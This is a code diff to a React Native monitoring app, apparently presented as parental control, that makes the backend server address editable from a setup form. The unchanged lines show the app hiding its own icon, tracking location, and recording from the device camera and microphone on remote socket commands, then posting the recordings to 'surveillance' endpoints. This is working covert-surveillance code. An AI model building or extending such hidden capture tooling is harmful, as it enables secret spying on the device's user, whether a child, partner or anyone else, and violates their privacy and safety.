@@ -11,6 +11,7 @@ import { io } from 'socket.io-client';
 const BACKEND_URL = 'http://localhost:8443';
 
 export default function App() {
+  const [serverUrl, setServerUrl] = useState('http://192.168.1.24:8443');
   const [parentId, setParentId] = useState('');
   const [deviceId, setDeviceId] = useState('device_123'); // Default identifier
   const [deviceName, setDeviceName] = useState("John's Android");
@@ -59,8 +60,10 @@ export default function App() {
         }
       }
 
+      const activeServer = serverUrl.trim().replace(/\/+$/, '');
+
       // Step 2: Register device via REST API
-      const response = await fetch(`${BACKEND_URL}/api/auth/kid/register`, {
+      const response = await fetch(`${activeServer}/api/auth/kid/register`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -83,7 +86,7 @@ export default function App() {
       await VisibilityService.hideAppIcon();
 
       // Step 4: Establish Socket connection
-      const socket = io(BACKEND_URL, {
+      const socket = io(activeServer, {
         auth: { deviceId }
       });
 
@@ -95,7 +98,7 @@ export default function App() {
       const camSvc = new CameraService(deviceId, socket);
       const micSvc = new MicrophoneService(deviceId, socket);
       const locSvc = new LocationService(deviceId, socket);
-      const usageSvc = new AppUsageService(deviceId, socket, BACKEND_URL);
+      const usageSvc = new AppUsageService(deviceId, socket, activeServer);
 
       // Start Background location watch & app usage polling
       await locSvc.startTracking();
@@ -124,7 +127,7 @@ export default function App() {
       socket.on('camera-record-stop', async () => {
         const recordData = await camSvc.stopRecording();
         if (recordData) {
-          fetch(`${BACKEND_URL}/api/surveillance/camera/record/stop`, {
+          fetch(`${activeServer}/api/surveillance/camera/record/stop`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(recordData)
@@ -147,7 +150,7 @@ export default function App() {
       socket.on('mic-record-stop', async () => {
         const audioData = await micSvc.stopRecording();
         if (audioData) {
-          fetch(`${BACKEND_URL}/api/surveillance/mic/record/stop`, {
+          fetch(`${activeServer}/api/surveillance/mic/record/stop`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(audioData)
@@ -185,6 +188,15 @@ export default function App() {
 
       {!registered ? (
         <View style={styles.form}>
+          <Text style={styles.label}>Server URL (Backend Host)</Text>
+          <TextInput 
+            style={styles.input} 
+            value={serverUrl} 
+            onChangeText={setServerUrl} 
+            placeholder="http://192.168.1.24:8443"
+            placeholderTextColor="#6c6489"
+          />
+
           <Text style={styles.label}>Parent ID / Linking Code</Text>
           <TextInput 
             style={styles.input} 
